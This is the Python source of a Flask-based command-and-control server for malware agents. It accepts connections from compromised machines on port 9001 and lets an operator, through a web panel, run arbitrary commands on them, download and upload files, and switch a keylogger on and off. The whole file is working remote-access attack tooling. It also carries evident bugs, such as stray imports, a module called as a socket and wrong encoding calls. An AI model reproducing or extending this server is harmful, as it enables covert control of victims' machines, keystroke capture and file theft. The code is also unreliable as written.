from ast import arg
from asyncio import threads
from concurrent.futures import thread
from doctest import OutputChecker
from glob import glob
from multiprocessing import connection
from operator import methodcaller
import socket,threading,time
from wsgiref.validate import InputWrapper
from flask import *
from pathlib import Path

ip = '0.0.0.0'
port = 9001

threads_index = 0
THREADS = []
IP_ADDR = []
INPUT_CMD = []
OUTPUT_CMD = []

for i in range(20):
	IP_ADDR.append('')
	INPUT_CMD.append('')
	OUTPUT_CMD.append('')

app = Flask(__name__)

def handle(client_soc, address, threads_index):
	global INPUT_CMD
	global OUTPUT_CMD
	while INPUT_CMD[threads_index] != 'quit':
		msg = client_soc.recv(2048).decode()
		OUTPUT_CMD[threads_index] = msg
		while True:

			if INPUT_CMD[threads_index] != '':

				if INPUT_CMD[threads_index].split(" ")[0] == 'download':
					filename = INPUT_CMD[threads_index].split(" ")[1].split("\\")[-1]
					cmd = INPUT_CMD[threads_index]
					client_soc.send(msg.encode())
					contents = client_soc.recv(1024 * 10000)
					f = open(filename, 'wb')
					f.write(contents.encode())
					f.close()
					OUTPUT_CMD[threads_index] = "File Transferred Successfuly :)"
					INPUT_CMD[threads_index] = ''

				elif INPUT_CMD[threads_index].split(" ")[0] == 'upload':
					cmd = INPUT_CMD[threads_index]
					client_soc.send(msg.encode())
					filename = INPUT_CMD[threads_index].split(" ")[1]
					filesize = INPUT_CMD[threads_index].split(" ")[2]
					f = open('.\\output\\' + filename, 'rb')
					contents = f.read()
					f.close()
					connection.send(contents)
					msg = client_soc.recv(2048).decode()

					if msg == 'File Transferred Successfully :)':
						OUTPUT_CMD[threads_index] = 'File Transferred Successfully :)'
						INPUT_CMD[threads_index] = ''

					else:
						OUTPUT_CMD[threads_index] = 'Some Error Occurred'
						INPUT_CMD[threads_index] = ''

				elif INPUT_CMD[threads_index] == "keylog on":
					cmd = INPUT_CMD[threads_index]
					client_soc.send(cmd.encode())
					msg = client_soc.recv(2048).decode()
					OUTPUT_CMD[threads_index] = msg
					INPUT_CMD[threads_index] = ''
				
				elif INPUT_CMD[threads_index] == "keylog off":
					cmd = INPUT_CMD[threads_index]
					client_soc.send(cmd.encode())
					msg = client_soc.recv(2048).decode()
					OUTPUT_CMD[threads_index] = msg
					INPUT_CMD[threads_index] = ''
				
				else:
					msg = INPUT_CMD[threads_index]
					# print("[client {}]> ".format(address) + msg.decode("utf-8"))
					client_soc.send(msg.encode())
					INPUT_CMD[threads_index] = ''
					break

	close_connection(client_soc)

def close_connection(client_soc):
	client_soc.close()
	THREADS[threads_index] = ''
	IP_ADDR[threads_index] = ''
	OUTPUT_CMD[threads_index] = ''
	INPUT_CMD[threads_index] = ''

def server_sock():
	sock_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock_server.bind((ip, port))
	# print("Listening for connections...")
	sock_server.listen(5)
	global THREADS
	global IP_ADDR

	while True:
		client_soc, address = sock_server.accept()
		# print("Got one! from {}".format(address))
		threads_index = len(THREADS)
		t = threading.Thread(target=handle, args=(client_soc, address,len(THREADS)))
		THREADS.append(t)
		IP_ADDR.append(address)
		t.start()

@app.before_first_request
def server_start():
	t1 = threading.Thread(target=server_sock)
	t1.start()

@app.route("/")
@app.route("/home")
@app.route("/index")
def index():
    return render_template('index.html')

@app.route("/agents")
def agents():
	return render_template('agents.html', threads=THREADS, ips=IP_ADDR)

@app.route("/<agentname>/execcmd")
def execcmd(agentname):
	return render_template('exec.html', name=agentname)

@app.route("/<agentname>/execute", methods=['GET','POST'])
def execute(agentname):
	if request.method == 'POST':
		cmd = request.form['command']
		for i in THREADS:
			if agentname in i.name:
				req_index = THREADS.index(i)
		INPUT_CMD[req_index] = cmd
		time.sleep(5)
		out_cmd = OUTPUT_CMD[req_index]
		return render_template('exec.html', out_cmd=out_cmd, name=agentname)

if __name__== '__main__':
    app.run(port = 5000, debug = True)